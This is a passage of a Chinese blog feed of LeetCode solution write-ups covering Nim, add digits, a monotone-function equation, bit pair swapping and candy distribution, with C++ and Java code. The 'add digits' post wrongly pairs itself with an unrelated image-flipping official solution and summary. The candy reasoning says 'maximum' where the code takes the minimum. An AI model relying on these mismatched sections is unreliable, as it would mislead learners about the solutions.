<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/nim-game/solution/nimyou-xi-by-leetcode/">官方题解</a>:</h6><p>如果堆中石头的数量 nn 不能被 44 整除，那么你总是可以赢得 Nim 游戏的胜利。</p>
<p><strong>推理</strong></p>
<p>让我们考虑一些小例子。显而易见的是，如果石头堆中只有一块、两块、或是三块石头，那么在你的回合，你就可以把全部石子拿走，从而在游戏中取胜。而如果就像题目描述那样，堆中恰好有四块石头，你就会失败。因为在这种情况下不管你取走多少石头，总会为你的对手留下几块，使得他可以在游戏中打败你。因此，要想获胜，在你的回合中，必须避免石头堆中的石子数为 4 的情况。</p>
<p>同样地，如果有五块、六块、或是七块石头，你可以控制自己拿取的石头数，总是恰好给你的对手留下四块石头，使他输掉这场比赛。但是如果石头堆里有八块石头，你就不可避免地会输掉，因为不管你从一堆石头中挑出一块、两块还是三块，你的对手都可以选择三块、两块或一块，以确保在再一次轮到你的时候，你会面对四块石头。</p>
<p>显然，它以相同的模式不断重复 $n=4,8,12,16,\dots$基本可以看出是 $4$ 的倍数。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canWinNim</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n % <span class="number">4</span> != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(1)$，只进行了一次检查。</li>
<li>空间复杂度：$O(1)$，没有使用额外的空间。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，想明白了也挺简单的，看到官方题解下一些评论说自己是sb???也还好吧,简简单单</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>各位相加</title>
    <url>/2020/12/21/%E5%90%84%E4%BD%8D%E7%9B%B8%E5%8A%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/add-digits/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个非负整数 <code>num</code>，反复将各个位上的数字相加，直到结果为一位数。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 38</span><br><span class="line">输出: 2 </span><br><span class="line">解释: 各位相加的过程为：3 + 8 &#x3D; 11, 1 + 1 &#x3D; 2。 由于 2 是一位数，所以返回 2。</span><br></pre></td></tr></table></figure>
<p><strong>进阶:</strong></p>
<p>你可以不使用循环或者递归，且在 O(1) 时间复杂度内解决这个问题吗？</p>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>递归，将各个位上数字相加，直到结果为一位数。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败14.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">addDigits</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(num)&#123;</span><br><span class="line">            sum+=num%<span class="number">10</span>;</span><br><span class="line">            num/=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum/<span class="number">10</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">            sum=addDigits(sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/flipping-an-image/solution/fan-zhuan-tu-xiang-by-leetcode/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>我们可以不使用额外的（非常数）空间来完成翻转和反转操作。对于 <code>A[i][j]​</code>，我们将它和 <code>A[i][c - j - 1]​</code> 进行交换（即翻转），其中 <code>c</code> 是数组 <code>A</code> 的列数。在交换的同时，我们可以将这两个数进行反转。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] flipAndInvertImage(<span class="keyword">int</span>[][] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> C = A[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] row: A)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (C + <span class="number">1</span>) / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = row[i] ^ <span class="number">1</span>;</span><br><span class="line">                row[i] = row[C - <span class="number">1</span> - i] ^ <span class="number">1</span>;</span><br><span class="line">                row[C - <span class="number">1</span> - i] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(M*N)$，其中 $M$ 和 $N$ 分别为数组 <code>A</code> 的行数和列数。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解和我的思路一样，不过对于特殊情况比我处理的好，也不算特殊情况吧，只是我自己把它当作特殊情况处理了，主要在于我使用了vector容器中的swap成员函数来交换两个元素，这样必须反转后覆盖原值，对于奇数行数矩阵的每行中间元素反转了两次，而采用tmp辅助变量来进行交换两个元素值不涉及到覆盖问题。其实就是太执着于STL模板库中的成员函数了，自己实现交换元素的功能也挺好，相当于对源码根据实际情况进行了改进，这样才能更灵活地处理问题。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>找出给定方程的正整数解</title>
    <url>/2020/12/03/%E6%89%BE%E5%87%BA%E7%BB%99%E5%AE%9A%E6%96%B9%E7%A8%8B%E7%9A%84%E6%AD%A3%E6%95%B4%E6%95%B0%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/find-positive-integer-solution-for-a-given-equation/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给出一个函数  <code>f(x, y)</code> 和一个目标结果 <code>z</code>，请你计算方程 <code>f(x,y) == z</code> 所有可能的正整数 <strong>数对</strong> <code>x</code> 和 <code>y</code>。</p>
<p>给定函数是严格单调的，也就是说：</p>
<p><code>f(x, y) &lt; f(x + 1, y)</code></p>
<p><code>f(x, y) &lt; f(x, y + 1)</code></p>
<a id="more"></a>
<p>函数接口定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface CustomFunction &#123;</span><br><span class="line">public:</span><br><span class="line">  &#x2F;&#x2F; Returns positive integer f(x, y) for any given positive integer x and y.</span><br><span class="line">  int f(int x, int y);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如果你想自定义测试，你可以输入整数 <code>function_id</code> 和一个目标结果 <code>z</code> 作为输入，其中 <code>function_id</code> 表示一个隐藏函数列表中的一个函数编号，题目只会告诉你列表中的 <code>2</code> 个函数。  </p>
<p>你可以将满足条件的 <strong>结果数对</strong> 按任意顺序返回。</p>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：function_id &#x3D; 1, z &#x3D; 5</span><br><span class="line">输出：[[1,4],[2,3],[3,2],[4,1]]</span><br><span class="line">解释：function_id &#x3D; 1 表示 f(x, y) &#x3D; x + y</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：function_id &#x3D; 2, z &#x3D; 5</span><br><span class="line">输出：[[1,5],[5,1]]</span><br><span class="line">解释：function_id &#x3D; 2 表示 f(x, y) &#x3D; x * y</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><p><code>1 &lt;= function_id &lt;= 9</code></p>
</li>
<li><p><code>1 &lt;= z &lt;= 100</code></p>
</li>
<li><p>题目保证 <code>f(x, y) == z</code> 的解处于 <code>1 &lt;= x, y &lt;= 1000</code> 的范围内。</p>
</li>
<li><p>在 <code>1 &lt;= x, y &lt;= 1000</code> 的前提下，题目保证 <code>f(x, y)</code> 是一个 32 位有符号整数。</p>
</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>对数对的第一个元素i的可能取值从1开始遍历，对每次取值从1遍历第二个元素j，如果函数值大于z就break，表示取值i时的数对已经遍历完成，终止程序的条件是f(i,1)的值大于z。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.7M，击败9.50%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * // This is the custom function interface.</span></span><br><span class="line"><span class="comment"> * // You should not implement it, or speculate about its implementation</span></span><br><span class="line"><span class="comment"> * class CustomFunction &#123;</span></span><br><span class="line"><span class="comment"> * public:</span></span><br><span class="line"><span class="comment"> *     // Returns f(x, y) for any given positive integers x and y.</span></span><br><span class="line"><span class="comment"> *     // Note that f(x, y) is increasing with respect to both x and y.</span></span><br><span class="line"><span class="comment"> *     // i.e. f(x, y) &lt; f(x + 1, y), f(x, y) &lt; f(x, y + 1)</span></span><br><span class="line"><span class="comment"> *     int f(int x, int y);</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">findSolution</span><span class="params">(CustomFunction&amp; customfunction, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">tmp</span><span class="params">(<span class="number">2</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(customfunction.f(i,j)==z)&#123;</span><br><span class="line">                    tmp[<span class="number">0</span>]=i;</span><br><span class="line">                    tmp[<span class="number">1</span>]=j;</span><br><span class="line">                    result.emplace_back(tmp);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(customfunction.f(i,j)&gt;z)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(customfunction.f(i,<span class="number">1</span>)&gt;z)&#123;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，正合我意该睡觉了😪，也还行比较简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>配对交换</title>
    <url>/2020/12/06/%E9%85%8D%E5%AF%B9%E4%BA%A4%E6%8D%A2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/exchange-lcci/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>配对交换。编写程序，交换某个整数的奇数位和偶数位，尽量使用较少的指令（也就是说，位0与位1交换，位2与位3交换，以此类推）。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 2（或者0b10）</span><br><span class="line">输出 1 (或者 0b01)</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 3</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<p><strong>提示:</strong></p>
<ol>
<li><code>num</code>的范围在[0, 2^30 - 1]之间，不会发生整数溢出。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历整数的二进制位数，每次取出两位（00，01，10，11）并记录其在二进制表示中的位置，只有01和10的情况会改变原整数，将原整数加上交换位置后的差值得到交换后的结果。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.3M，击败6.04%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">exchangeBits</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=num;</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//定义tmp存储两位二进制的值,0,1,2,3</span></span><br><span class="line">        <span class="keyword">int</span> tmp=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(num)&#123;</span><br><span class="line">            tmp=num%<span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span>(tmp==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">//加上交换后的差值</span></span><br><span class="line">                result+=<span class="built_in">pow</span>(<span class="number">2</span>,i+<span class="number">1</span>)-<span class="built_in">pow</span>(<span class="number">2</span>,i);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(tmp==<span class="number">2</span>)&#123;</span><br><span class="line">                result+=<span class="built_in">pow</span>(<span class="number">2</span>,i)-<span class="built_in">pow</span>(<span class="number">2</span>,i+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            num/=<span class="number">4</span>;</span><br><span class="line">            i+=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，简单。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>分糖果</title>
    <url>/2020/12/22/%E5%88%86%E7%B3%96%E6%9E%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/distribute-candies/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个偶数长度的数组，其中不同的数字代表着不同种类的糖果，每一个数字代表一个糖果。你需要把这些糖果平均分给一个弟弟和一个妹妹。返回妹妹可以获得的最大糖果的种类数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: candies &#x3D; [1,1,2,2,3,3]</span><br><span class="line">输出: 3</span><br><span class="line">解析: 一共有三种种类的糖果，每一种都有两个。</span><br><span class="line">     最优分配方案：妹妹获得[1,2,3],弟弟也获得[1,2,3]。这样使妹妹获得糖果的种类数最多。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: candies &#x3D; [1,1,2,3]</span><br><span class="line">输出: 2</span><br><span class="line">解析: 妹妹获得糖果[2,3],弟弟获得糖果[1,1]，妹妹有两种不同的糖果，弟弟只有一种。这样使得妹妹可以获得的糖果种类数最多。</span><br></pre></td></tr></table></figure>
<p><strong>注意:</strong></p>
<ol>
<li>数组的长度为[2, 10,000]，并且确定为偶数。</li>
<li>数组中数字的大小在范围[-100,000, 100,000]内。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>妹妹可以获得的最大糖果的种类数其实就是妹妹的糖果数量和总的糖果种类两者中的最大值。有了这个思路使用计数法就可以实现了，也很简单。</p>
<p><strong>c++代码：</strong>(执行用时636ms，击败50.37%，内存消耗113.9M，击败30.43%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">distributeCandies</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; candyType)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//糖果的个数</span></span><br><span class="line">        <span class="keyword">int</span> num=candyType.size();</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:candyType)&#123;</span><br><span class="line">            ++m[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//糖果的种类数</span></span><br><span class="line">        <span class="keyword">int</span> kind=m.size();</span><br><span class="line">        <span class="comment">//num/2是妹妹得到的糖果数量</span></span><br><span class="line">        <span class="keyword">return</span> num/<span class="number">2</span>&gt;kind?kind:num/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/distribute-candies/solution/fen-tang-guo-by-leetcode/">官方题解</a>:</h6><p><strong>方法一：暴力法</strong><br>算法：</p>
<p>暴力法非常简单。我们可以生成代表糖果的给定 $nums$数组的所有排列，并确定所生成数组前半部分中唯一元素的数目。<br>为了确定数组前半部分中唯一元素的数目，我们将所有需要的元素放在一个集合中，并计算集合中元素的数目。我们在生成的数组的前半部分中为所有可能的排列计算这样的唯一元素，并返回最大集合的大小</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Solution &#123;</span><br><span class="line">    int max_kind &#x3D; 0;</span><br><span class="line">    public int distributeCandies(int[] nums) &#123;</span><br><span class="line">        permute(nums, 0);</span><br><span class="line">        return max_kind;</span><br><span class="line">    &#125;</span><br><span class="line">    public void permute(int[] nums, int l) &#123;</span><br><span class="line">        if (l &#x3D;&#x3D; nums.length - 1) &#123;</span><br><span class="line">            HashSet &lt; Integer &gt; set &#x3D; new HashSet &lt; &gt; ();</span><br><span class="line">            for (int i &#x3D; 0; i &lt; nums.length &#x2F; 2; i++) &#123;</span><br><span class="line">                set.add(nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            max_kind &#x3D; Math.max(max_kind, set.size());</span><br><span class="line">        &#125;</span><br><span class="line">        for (int i &#x3D; l; i &lt; nums.length; i++) &#123;</span><br><span class="line">            swap(nums, i, l);</span><br><span class="line">            permute(nums, l + 1);</span><br><span class="line">            swap(nums, i, l);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public void swap(int[] nums, int x, int y) &#123;</span><br><span class="line">        int temp &#x3D; nums[x];</span><br><span class="line">        nums[x] &#x3D; nums[y];</span><br><span class="line">        nums[y] &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n!)$。</li>
<li>空间复杂度：$O(n)$，递归树的深度可以达到 $n$。</li>
</ul>
<p><strong>方法二：优化的暴力法</strong></p>
<p><strong>算法：</strong></p>
<p>在研究这种方法之前，首先我们需要观察一点。女孩能得到的唯一糖果的最大数量可以是 $n/2$，其中 $n$ 是指糖果的数量。此外，如果独特的糖果数量低于 $n/2$ 的话，为了使女孩能得到的独特的糖果数量最大化，我们会将所有独特的糖果分配给女孩。因此，在这种情况下，女孩得到的独特糖果数量等于给定 $candies$ 数组中的独特糖果总数。<br>现在,我们需要在给定的 $candies$ 数组中找到唯一糖果的总数。找到唯一糖果数量的一种方法是遍历给定的 $candies$数组。每当我们遇到一个元素，比如 $candies[j]$ 时，我们可以将所有与 $candies[j]$相同的元素标记为无效，并将唯一元素的计数增加 1。<br>最后，$count$ 会提供给女孩所需数量的独特糖果。此外，要返回的值由：$\text{min}(\frac{n}{2}, count)$ 给出。当 $count$ 超过 $\frac{n}{2}$ 时，我们可以停止对给定 $candies$ 数组的遍历。</p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">distributeCandies</span><span class="params">(<span class="keyword">int</span>[] candies)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; candies.length &amp;&amp; count &lt; candies.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (candies[i] != Integer.MIN_VALUE) &#123;</span><br><span class="line">                count++;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; candies.length; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (candies[j] == candies[i])</span><br><span class="line">                        candies[j] = Integer.MIN_VALUE;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n^2)$。对于每一个新发现的元素，我们遍历 $candies$的所有元素。在最坏的情况下，我们对 $candies$ 的每个元素都这样做。$n$ 表示 $candies$数组的大小。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法三：排序</strong></p>
<p><strong>算法：</strong></p>
<p>我们可以对给定的 $candies$数组进行排序，并通过比较排序数组的相邻元素来</p>
<p>找出唯一的元素。对于找到的每个新元素（与前一个元素不同），我们需要更新 </p>
<p>$count$。最后，我们可以将所需结果返回为 $\text{min}(n/2,count)$，如前面的方法所述。</p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">distributeCandies</span><span class="params">(<span class="keyword">int</span>[] candies)</span> </span>&#123;</span><br><span class="line">        Arrays.sort(candies);</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; candies.length &amp;&amp; count &lt; candies.length / <span class="number">2</span>; i++)</span><br><span class="line">            <span class="keyword">if</span> (candies[i] &gt; candies[i - <span class="number">1</span>])</span><br><span class="line">                count++;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n\log n)$。排序需要 $O(n\log n)$ 的时间。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法四：集合set</strong></p>
<p><strong>算法：</strong></p>
